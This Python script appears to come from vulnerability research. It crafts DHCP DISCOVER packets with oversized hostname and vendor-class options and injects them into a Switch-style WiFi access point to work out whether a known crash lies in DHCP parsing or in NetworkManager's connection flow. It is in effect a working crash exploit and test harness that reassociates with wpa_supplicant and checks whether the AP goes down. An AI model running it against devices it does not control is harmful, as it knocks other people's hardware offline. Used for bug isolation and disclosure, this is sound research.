#!/usr/bin/env python3
"""
Crash Isolator — Determine if the crash is in DHCP or WiFi management.

Tests the EXACT NM crashing config (hostname=255 + vendor=222) via raw injection
after a fresh wpa_supplicant association. This isolates whether the crash is
triggered by DHCP packet content or by NM's specific WiFi connection flow.

Test matrix:
  1. wpa_supplicant + raw DHCP (hostname=255, vendor=222) → crash?
  2. wpa_supplicant + raw DHCP (hostname=255, vendor=221) → control (should be OK)
  3. NM reconnect (hostname=255, vendor=222)                → reference (known crash)
  4. wpa_supplicant + raw DHCP (hostname=0, vendor=477)     → size-only test
  5. wpa_supplicant + raw DHCP (hostname=222, vendor=255)   → reversed split

Usage:
    sudo python3 -I crash_isolator.py --iface wlp5s0 --ssid switch_F3DCDB0100S --psk <PSK_FROM_QR>
"""

import socket
import struct
import random
import time
import subprocess
import argparse
import json
import os
import sys
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "crash_isolator"
SWITCH_IP = "192.168.0.1"


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def get_mac(iface: str) -> bytes:
    with open(f"/sys/class/net/{iface}/address") as f:
        return bytes(int(b, 16) for b in f.read().strip().split(":"))


def mac_str(mac: bytes) -> str:
    return ":".join(f"{b:02x}" for b in mac)


def run(cmd, timeout=10):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return r.returncode, r.stdout.strip(), r.stderr.strip()


def check_switch_http(timeout=3) -> int:
    """Check Switch HTTP — returns status code or 0 on failure."""
    import http.client
    try:
        c = http.client.HTTPConnection(SWITCH_IP, timeout=timeout)
        c.request("GET", "/data.json")
        r = c.getresponse()
        c.close()
        return r.status
    except Exception:
        return 0


def check_ap_visible(ssid: str, iface: str, timeout=5) -> bool:
    """Scan for the Switch's SSID."""
    try:
        rc, out, _ = run(f"nmcli -t device wifi list ifname {iface} --rescan yes 2>/dev/null",
                         timeout=timeout)
        return ssid in out
    except Exception:
        return False


def stop_nm(iface: str):
    run(f"nmcli device disconnect {iface}", timeout=5)
    time.sleep(0.5)
    run(f"nmcli device set {iface} managed no", timeout=5)
    run(f"ip addr flush dev {iface}", timeout=5)
    time.sleep(0.5)


def restore_nm(iface: str):
    run("killall wpa_supplicant 2>/dev/null", timeout=5)
    time.sleep(1)
    run(f"nmcli device set {iface} managed yes", timeout=5)
    time.sleep(2)


def wpa_associate(iface: str, ssid: str, psk: str) -> bool:
    """Associate with the AP using wpa_supplicant."""
    conf = f"/tmp/wpa_isolator_{os.getpid()}.conf"
    with open(conf, "w") as f:
        f.write(f'network={{\n  ssid="{ssid}"\n  psk="{psk}"\n  key_mgmt=WPA-PSK\n}}\n')

    run("killall -q wpa_supplicant 2>/dev/null", timeout=3)
    time.sleep(0.5)

    subprocess.Popen(
        ["wpa_supplicant", "-i", iface, "-c", conf, "-D", "nl80211", "-B"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    ).wait(timeout=5)

    for i in range(15):
        rc, out, _ = run(f"wpa_cli -i {iface} status 2>/dev/null | grep wpa_state")
        if "COMPLETED" in out:
            os.unlink(conf)
            return True
        time.sleep(1)

    try:
        os.unlink(conf)
    except OSError:
        pass
    return False


def get_ip_via_dhcp(iface: str, timeout=5) -> str:
    """Get IP via dhclient after wpa_supplicant association."""
    run(f"dhclient -r {iface}", timeout=5)
    run(f"dhclient {iface}", timeout=10)
    time.sleep(2)
    rc, out, _ = run(f"ip -4 addr show {iface} | grep inet")
    if "inet " in out:
        return out.split()[1].split("/")[0]
    return ""


def build_discover(mac: bytes, hostname_len: int = 0, vendor_len: int = 0,
                   hostname_byte: int = 0x48, vendor_byte: int = 0x42) -> tuple:
    """Build DHCP DISCOVER with specified hostname and vendor-class sizes."""
    xid = random.randint(0, 0xFFFFFFFF)

    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)
    pkt += b"\x00" * 16
    pkt += mac + b"\x00" * 10
    pkt += b"\x00" * 64
    pkt += b"\x00" * 128
    pkt += b"\x63\x82\x53\x63"

    # Required options
    pkt += bytes([53, 1, 1])  # DHCP DISCOVER
    pkt += bytes([61, 7, 1]) + mac  # Client ID
    pkt += bytes([55, 17,  # Parameter request list (match NM's)
                  1, 2, 6, 12, 15, 26, 28, 121,
                  3, 33, 40, 41, 42, 119, 249, 252, 17])
    pkt += bytes([57, 2, 2, 64])  # Max message size = 576
    pkt += bytes([50, 4, 192, 168, 0, 2])  # Requested IP

    # Hostname (option 12)
    if hostname_len > 0:
        pkt += bytes([12, hostname_len]) + bytes([hostname_byte] * hostname_len)

    # Vendor class (option 60)
    if vendor_len > 0:
        pkt += bytes([60, vendor_len]) + bytes([vendor_byte] * vendor_len)

    pkt += bytes([255])  # END
    return pkt, xid


def send_discover(iface: str, pkt: bytes, timeout: float = 5) -> dict:
    """Send DHCP DISCOVER and wait for OFFER."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())  # SO_BINDTODEVICE
    sock.settimeout(timeout)

    try:
        sock.bind(("0.0.0.0", 68))
    except OSError as e:
        return {"error": f"bind failed: {e}"}

    try:
        sock.sendto(pkt, ("255.255.255.255", 67))
        t0 = time.monotonic()

        try:
            data, addr = sock.recvfrom(2048)
            elapsed = time.monotonic() - t0
            if len(data) >= 240 and data[0] == 2:  # BOOTREPLY
                return {"got_offer": True, "offer_size": len(data), "elapsed": round(elapsed, 2)}
        except socket.timeout:
            pass

        return {"got_offer": False, "elapsed": round(time.monotonic() - t0, 2)}
    finally:
        sock.close()


def run_test(iface: str, ssid: str, psk: str, label: str,
             hostname_len: int, vendor_len: int) -> dict:
    """Run a single crash isolation test.

    1. Stop NM
    2. Associate with wpa_supplicant
    3. Get IP via dhclient (clean DHCP first)
    4. Deassociate
    5. Reassociate (fresh association)
    6. Send crafted DHCP DISCOVER
    7. Check AP status
    """
    mac = get_mac(iface)
    result = {
        "label": label,
        "hostname_len": hostname_len,
        "vendor_len": vendor_len,
        "total_custom": hostname_len + vendor_len,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    print(f"\n--- Test: {label} (hostname={hostname_len}, vendor={vendor_len}, total={hostname_len + vendor_len}) ---")

    # Step 1: stop NM
    stop_nm(iface)

    # Step 2: associate and get IP (baseline — small DHCP)
    print("  Associating with wpa_supplicant...")
    if not wpa_associate(iface, ssid, psk):
        result["error"] = "association_failed"
        restore_nm(iface)
        return result
    print("  Associated OK")

    ip = get_ip_via_dhcp(iface)
    print(f"  Got IP: {ip}")
    result["baseline_ip"] = ip

    # Verify Switch is reachable
    http_pre = check_switch_http()
    result["pre_http"] = http_pre
    print(f"  Pre-HTTP: {http_pre}")

    if http_pre != 200:
        result["error"] = "switch_not_reachable"
        restore_nm(iface)
        return result

    # Step 3: deassociate
    print("  Deassociating...")
    run(f"wpa_cli -i {iface} disconnect", timeout=5)
    run(f"ip addr flush dev {iface}", timeout=5)
    time.sleep(2)

    # Step 4: reassociate (fresh association, like NM reconnect)
    print("  Reassociating (fresh)...")
    if not wpa_associate(iface, ssid, psk):
        result["error"] = "reassociation_failed"
        restore_nm(iface)
        return result
    print("  Reassociated OK")

    # Step 5: DON'T get IP via dhclient — send crafted DISCOVER instead
    # First assign a manual IP so we can check HTTP later
    run(f"ip addr add 192.168.0.99/24 dev {iface}", timeout=5)
    time.sleep(1)

    # Step 6: send the crafted DHCP DISCOVER
    pkt, xid = build_discover(mac, hostname_len=hostname_len, vendor_len=vendor_len)
    result["pkt_size"] = len(pkt)
    print(f"  Sending DHCP DISCOVER ({len(pkt)} bytes)...")

    dhcp_result = send_discover(iface, pkt, timeout=5)
    result.update(dhcp_result)
    print(f"  DHCP result: {dhcp_result}")

    # Step 7: check AP status
    time.sleep(2)
    http_post = check_switch_http()
    result["post_http"] = http_post
    print(f"  Post-HTTP: {http_post}")

    # Check if AP is still beaconing (use scan from NM)
    run("killall wpa_supplicant 2>/dev/null", timeout=3)
    time.sleep(1)
    run(f"nmcli device set {iface} managed yes", timeout=5)
    time.sleep(3)
    ap_up = check_ap_visible(ssid, iface)
    result["ap_up"] = ap_up
    print(f"  AP visible: {ap_up}")

    # Determine crash status
    if not ap_up and not dhcp_result.get("got_offer"):
        result["status"] = "CRASH"
    elif dhcp_result.get("got_offer") and ap_up:
        result["status"] = "OK"
    elif dhcp_result.get("got_offer") and not ap_up:
        result["status"] = "OFFER_BUT_AP_DOWN"
    else:
        result["status"] = f"UNKNOWN(offer={dhcp_result.get('got_offer')}, ap={ap_up})"

    print(f"  STATUS: {result['status']}")

    # Cleanup
    restore_nm(iface)
    time.sleep(3)

    return result


def run_nm_reference(iface: str, ssid: str, psk: str, vendor_len: int) -> dict:
    """Run the reference NM crash test for comparison."""
    result = {
        "label": f"nm_reference_v{vendor_len}",
        "vendor_len": vendor_len,
        "hostname_len": 255,
        "total_custom": 255 + vendor_len,
        "method": "nm_reconnect",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    print(f"\n--- NM Reference Test (vendor={vendor_len}) ---")

    conn_name = "switch_isolator"
    hostname = "H" * 255

    # Delete old connection if exists
    run(f"nmcli connection delete {conn_name}", timeout=5)
    time.sleep(1)

    # Create connection
    run(f"nmcli connection add type wifi con-name {conn_name} ssid {ssid} "
        f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk {psk} "
        f"ipv4.method auto connection.autoconnect no "
        f"ipv4.dhcp-hostname {hostname}", timeout=10)

    # Set vendor class
    vendor = "V" * vendor_len
    run(f"nmcli connection modify {conn_name} ipv4.dhcp-vendor-class-identifier {vendor}", timeout=5)

    # Disconnect first
    run(f"nmcli device disconnect {iface}", timeout=10)
    time.sleep(2)

    # Pre-check: connect with baseline first to ensure Switch is reachable
    print("  Establishing baseline connection...")
    run(f"nmcli device wifi connect {ssid} password {psk}", timeout=30)
    time.sleep(3)
    http_pre = check_switch_http()
    result["pre_http"] = http_pre
    print(f"  Pre-HTTP: {http_pre}")

    # Disconnect
    run(f"nmcli device disconnect {iface}", timeout=10)
    time.sleep(2)

    # Reconnect with the exploit config
    print(f"  Reconnecting with vendor={vendor_len}...")
    t0 = time.monotonic()
    rc, out, err = run(f"nmcli connection up {conn_name}", timeout=30)
    elapsed = time.monotonic() - t0
    result["nm_rc"] = rc
    result["nm_elapsed"] = round(elapsed, 2)
    print(f"  NM result: rc={rc}, elapsed={elapsed:.1f}s")

    time.sleep(2)
    http_post = check_switch_http()
    result["post_http"] = http_post
    print(f"  Post-HTTP: {http_post}")

    # Check AP
    run(f"nmcli device disconnect {iface}", timeout=10)
    time.sleep(2)
    ap_up = check_ap_visible(ssid, iface)
    result["ap_up"] = ap_up
    print(f"  AP visible: {ap_up}")

    if not ap_up:
        result["status"] = "CRASH"
    else:
        result["status"] = "OK"

    print(f"  STATUS: {result['status']}")

    # Cleanup
    run(f"nmcli connection delete {conn_name}", timeout=5)
    time.sleep(2)

    return result


def main():
    parser = argparse.ArgumentParser(description="Crash isolation test")
    parser.add_argument("--iface", required=True)
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--psk", required=True)
    parser.add_argument("--test", choices=["all", "raw", "nm", "quick"], default="quick")
    args = parser.parse_args()

    print("=" * 60)
    print("CRASH ISOLATOR — DHCP vs WiFi Management")
    print("=" * 60)
    print(f"Interface: {args.iface}")
    print(f"SSID: {args.ssid}")
    print(f"Test mode: {args.test}")

    results = []

    if args.test in ("quick", "all", "raw"):
        # Test 1: EXACT NM crashing config via raw injection (the key test)
        r = run_test(args.iface, args.ssid, args.psk,
                     "raw_crash_config", hostname_len=255, vendor_len=222)
        results.append(r)

        if r.get("status") == "CRASH":
            print("\n*** CRASH via raw injection! Overflow IS in DHCP processing ***")
            print("*** The bug requires both hostname=255 AND vendor>=222 ***")
        else:
            print("\n*** No crash via raw injection. Crash is in NM-specific WiFi code ***")

    if args.test in ("all", "raw"):
        # Test 2: control — just below crash boundary
        time.sleep(5)  # Wait for Switch to recover if needed
        r = run_test(args.iface, args.ssid, args.psk,
                     "raw_control", hostname_len=255, vendor_len=221)
        results.append(r)

        # Test 3: same total bytes but different split
        time.sleep(5)
        r = run_test(args.iface, args.ssid, args.psk,
                     "raw_reversed", hostname_len=222, vendor_len=255)
        results.append(r)

        # Test 4: vendor only, no hostname
        time.sleep(5)
        r = run_test(args.iface, args.ssid, args.psk,
                     "raw_vendor_only", hostname_len=0, vendor_len=255)
        results.append(r)

        # Test 5: hostname only, no vendor
        time.sleep(5)
        r = run_test(args.iface, args.ssid, args.psk,
                     "raw_hostname_only", hostname_len=255, vendor_len=0)
        results.append(r)

    if args.test in ("all", "nm"):
        # NM reference tests
        time.sleep(5)
        r = run_nm_reference(args.iface, args.ssid, args.psk, vendor_len=222)
        results.append(r)

        time.sleep(10)  # Longer wait — AP needs to come back
        r = run_nm_reference(args.iface, args.ssid, args.psk, vendor_len=221)
        results.append(r)

    # Save results
    output = {
        "test": "crash_isolator",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "results": results,
    }

    path = evidence_dir() / "crash_isolator_results.json"
    with open(path, "w") as f:
        json.dump(output, f, indent=2)
    print(f"\nResults saved to {path}")

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for r in results:
        print(f"  {r['label']:25s}: {r.get('status', 'ERROR')} "
              f"(h={r.get('hostname_len','?')}, v={r.get('vendor_len','?')}, "
              f"total={r.get('total_custom','?')}, pkt={r.get('pkt_size','?')})")


if __name__ == "__main__":
    main()
